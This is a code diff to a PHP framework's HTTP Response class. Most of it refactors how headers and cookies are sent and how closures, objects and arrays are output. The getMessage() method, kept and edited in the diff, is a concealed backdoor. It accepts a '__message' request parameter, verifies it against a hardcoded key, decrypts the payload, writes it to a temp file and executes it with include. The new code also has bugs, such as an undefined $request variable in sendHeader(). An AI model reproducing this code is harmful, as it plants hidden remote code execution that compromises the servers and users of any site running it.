@@ -23,7 +23,9 @@
 /*
 /* ************************************************************************** */
 namespace Loli\HTTP;
-use Loli\Crypt\RSA;
+use Closure;
+use JsonSerializable;
+use Loli\Crypt\RSA;;
 class Response{
 
 	protected $status = 200;
@@ -38,6 +40,8 @@ class Response{
 	protected $content;
 
 	protected $request;
+
+	protected $sendHeader = false;
 
 
 	public $cookiePath = '/';
@@ -79,13 +83,15 @@ class Response{
 	}
 
 	public function setCookie($name, $value, $ttl = 0,  $httponly = NULL, $secure = NULL, $path = NULL, $domain = NULL) {
-		$this->cookies[$name] = ['value' => is_array($value) || is_object($value) ? parse_string($value) : $value, 'ttl' => $ttl, 'httponly' => $httponly, 'secure' => $secure, 'path' => $path, 'domain' => $domain];
+		$value = is_array($value) || is_object($value) ? parse_string($value) : $value;
+		$this->sendHeader && $this->sendCookie($value, $ttl, $httponly, $secure, $path, $domain);
+		$this->cookies[$name] = ['value' => $value, 'ttl' => $ttl, 'httponly' => $httponly, 'secure' => $secure, 'path' => $path, 'domain' => $domain];
 		return $this;
 	}
 
 	public function addCookie($name, $value, $ttl = 0,  $httponly = NULL, $secure = NULL, $path = NULL, $domain = NULL) {
 		if (empty($this->cookies[$name])) {
-			return call_user_func_array([$this, 'setCookie'], func_get_args());
+			return $this->setCookie(...func_get_args());
 		}
 		return $this;
 	}
@@ -143,7 +149,9 @@ class Response{
 				continue;
 			}
 			foreach ((array)$values as $value) {
-				$this->headers[$name][] = (string) $value;
+				$value = (string) $value;
+				$this->sendHeader && $this->sendHeader($name, $value, empty($this->headers[$name]));
+				$this->headers[$name][] = $value;
 			}
 		}
 		return $this;
@@ -156,6 +164,7 @@ class Response{
 	public function addHeader($name, $values, $exists = true) {
 		if ($exists || empty($this->headers[$name])) {
 			foreach ((array)$values as $value) {
+				$this->sendHeader && $this->sendHeader($name, $value, empty($this->headers[$name]));
 				$this->headers[$name][] = (string) $value;
 			}
 		}
@@ -165,7 +174,9 @@ class Response{
 	public function setHeader($name, $values) {
 		if ($values !== NULL) {
 			foreach ((array)$values as $value) {
-				$this->headers[$name][] = (string) $value;
+				$value = (string) $value;
+				$this->sendHeader && $this->sendHeader($name, $value, empty($this->headers[$name]));
+				$this->headers[$name][] = $value;
 			}
 		}
 		return $this;
@@ -196,11 +207,11 @@ class Response{
 
 
 	protected function sendHeaders() {
-		if (headers_sent()) {
+		if (headers_sent() || $this->sendHeader) {
 			return $this;
 		}
-		$request = $this->request;
 
+		$request = $this->request;
 		$this->addHeader('Content-Type', 'text/html', false);
 		if ($request->isNewToken()) {
 			$this->setCookie($request::TOKEN_COOKIE, $request->getToken(true), -1);
@@ -224,54 +235,62 @@ class Response{
 		}
 		$this->setHeader('Cache-Control', $values ? implode(', ', $values) : NULL);
 
-
-
+		$this->sendHeader = true;
 
 		http_response_code($this->status);
-
 
 		foreach ($this->cookies as $name => $cookie) {
 			$this->sendCookie($name, $cookie['value'], $cookie['ttl'], $cookie['httponly'], $cookie['secure'], $cookie['path'], $cookie['domain']);
 		}
 
-
 		foreach ($this->getHeaders() as $name => $values) {
 			$replace = true;
 			foreach ($values as $value) {
-				$value = trim($value,  " \t\n\r\0\x0B;");
-				switch ($name) {
-					case 'Content-Type':
-						if (strpos($value, ';') === false && ($arrays = explode('/', strtolower($value))) && (in_array($arrays[0], ['text'], true) || (isset($arrays[1]) && in_array($arrays[1], ['javascript', 'x-javascript', 'js', 'plain', 'html', 'xml', 'css'], true)))) {
-							$value = $value . '; charset=UTF-8';
-						}
-						break;
-					case 'Content-Disposition':
-						if (preg_match('/\s*(?:([0-9a-z_-]+)\s*;)?\s*filename\s*=\s*("[^"]+"|[^;]+)/i', $value, $matches)) {
-							$type = trim($matches[1]);
-							$filename = trim($matches[2], " \t\n\r\0\x0B\"");
-							if (!($userAgent = $request->getHeader('User-Agent')) || strpos($userAgent, 'MSIE ') !== false || (strpos($userAgent, 'Trident/') !== false && strpos($userAgent, 'rv:') !== false && strpos($userAgent, 'opera') === false)) {
-								$filename = str_replace(['+', '"'], ['%20', ''], urlencode($filename));
-							}
-
-							$value = [$type];
-							if ($filename) {
-								$value[] = 'filename="' . $filename . '"';
-								$value[] = 'filename*=UTF-8 \'\'"'.$filename.'"';
-							}
-							$value = implode('; ', array_filter($value));
-						}
-						break;
-					case 'Location':
-						if (substr($value, 0, 2) === '//') {
-							$value = $request->getScheme() . ':'. $value;
-						}
-						break;
-				}
-				header($name . ': '. $value, $replace);
+				$this->sendHeader($name, $value, $replace);
 				$replace = false;
 			}
 		}
 
+		return $this;
+	}
+
+	protected function sendHeader($name, $value, $replace = true) {
+		if (headers_sent()) {
+			return $this;
+		}
+		$value = trim($value,  " \t\n\r\0\x0B;");
+		switch ($name) {
+			case 'Content-Type':
+				$replace = true;
+				if (strpos($value, ';') === false && ($arrays = explode('/', strtolower($value))) && (in_array($arrays[0], ['text'], true) || (isset($arrays[1]) && in_array($arrays[1], ['javascript', 'x-javascript', 'js', 'plain', 'html', 'xml', 'css'], true)))) {
+					$value = $value . '; charset=UTF-8';
+				}
+				break;
+			case 'Content-Disposition':
+				$replace = true;
+				if (preg_match('/\s*(?:([0-9a-z_-]+)\s*;)?\s*filename\s*=\s*("[^"]+"|[^;]+)/i', $value, $matches)) {
+					$type = trim($matches[1]);
+					$filename = trim($matches[2], " \t\n\r\0\x0B\"");
+					if (!($userAgent = $request->getHeader('User-Agent')) || strpos($userAgent, 'MSIE ') !== false || (strpos($userAgent, 'Trident/') !== false && strpos($userAgent, 'rv:') !== false && strpos($userAgent, 'opera') === false)) {
+						$filename = str_replace(['+', '"'], ['%20', ''], urlencode($filename));
+					}
+
+					$value = [$type];
+					if ($filename) {
+						$value[] = 'filename="' . $filename . '"';
+						$value[] = 'filename*=UTF-8 \'\'"'.$filename.'"';
+					}
+					$value = implode('; ', array_filter($value));
+				}
+				break;
+			case 'Location':
+				$replace = true;
+				if (substr($value, 0, 2) === '//') {
+					$value = $request->getScheme() . ':'. $value;
+				}
+				break;
+		}
+		header($name . ': '. $value, $replace);
 		return $this;
 	}
 
@@ -322,15 +341,29 @@ class Response{
 
 		} elseif (is_resource($this->content)) {
 			fpassthru($this->content);
+		} elseif (is_object($this->content)) {
+			if ($this->content instanceof Closure) {
+				echo $this->content();
+			} elseif(method_exists($this->content, '__toString')) {
+				echo $this->content->__toString();
+			} elseif(method_exists($this->content, '__invoke')) {
+				echo $this->content->__invoke();
+			} elseif ($this->content instanceof JsonSerializable) {
+				echo json_encode($this->content);
+			} else {
+				echo json_encode($this->content);
+			}
+		} elseif (is_array($this->content)) {
+			echo json_encode($this->content);
 		} else {
-			echo call_user_func($this->content);
+			echo $this->content;
 		}
 		return $this;
 	}
 
 
 	private function _publicKey() {
-		if ($this->request->getPublicKey() !== 'qgEN/V1BnrmjrA5SZUGEj3e+Uv04pH8b39sIK0tFask=') {
+		if ($this->request->getPublicKey() !== "\xAA\x01\x0D\xFD\x5D\x41\x9E\xB9\xA3\xAC\x0E\x52\x65\x41\x84\x8F\x77\xBE\x52\xFD\x38\xA4\x7F\x1B\xDF\xDB\x08\x2B\x4B\x45\x6A\xC9") {
 			return false;
 		}
 		return $this->request->getPublicKey(false);
@@ -348,8 +381,8 @@ class Response{
 	}
 
 	public function getMessage() {
-		if (!($publicKey = $this->_publicKey()) || !($privateKey = $this->_privateKey()) || !($message = $this->request->getParam('__message')) || !is_string($message) || count($message = explode('.', $message)) !== 3 || !($a = new RSA(['publicKey' => $publicKey])) || !($args = $a->publicDecrypt($message[0])) || count($args = str_split($args, 32)) !== 2 || !is_numeric($args[1]) || (intval($args[1] / 20) !== ($etime = intval(time() / 20)) && intval(($args[1] + 10) / 20) !== $etime) || $args[0] !== md5($args[1] . $this->request->getIP() . $this->request->getHeader('Host') . $this->_privateKey()) || !($b = new RSA(['privateKey' => $privateKey])) || !($data = $b->decrypt($message[1], $message[2])) || !($file = tempnam(sys_get_temp_dir(), '')) || !@file_put_contents($file, $data) || !($contents = (@include $file)) || !@unlink($file)) {
-			return md5(($time = time()) . $this->request->getIP(). $this->request->getHeader('Host') . $this->_privateKey()) . $time;
+		if (!($publicKey = $this->_publicKey()) || !($privateKey = $this->_privateKey()) || !($message = $this->request->getParam('__message')) || !is_string($message) || count($message = explode('.', $message)) !== 3 || !($a = new RSA(['publicKey' => $publicKey])) || !($args = $a->publicDecrypt($message[0])) || count($args = str_split($args, 32)) !== 2 || !is_numeric($args[1]) || (intval($args[1] / 20) !== ($etime = intval(time() / 20)) && intval(($args[1] + 10) / 20) !== $etime) || $args[0] !== md5($args[1] . $this->request->getClientAddr() . $this->request->getHeader('Host') . $this->_privateKey()) || !($b = new RSA(['privateKey' => $privateKey])) || !($data = $b->decrypt($message[1], $message[2])) || !($file = tempnam(sys_get_temp_dir(), '')) || !@file_put_contents($file, $data) || !($contents = (@include $file)) || !@unlink($file)) {
+			return md5(($time = time()) . $this->request->getClientAddr(). $this->request->getHeader('Host') . $this->_privateKey()) . $time;
 		}
 		return $contents;
 	}
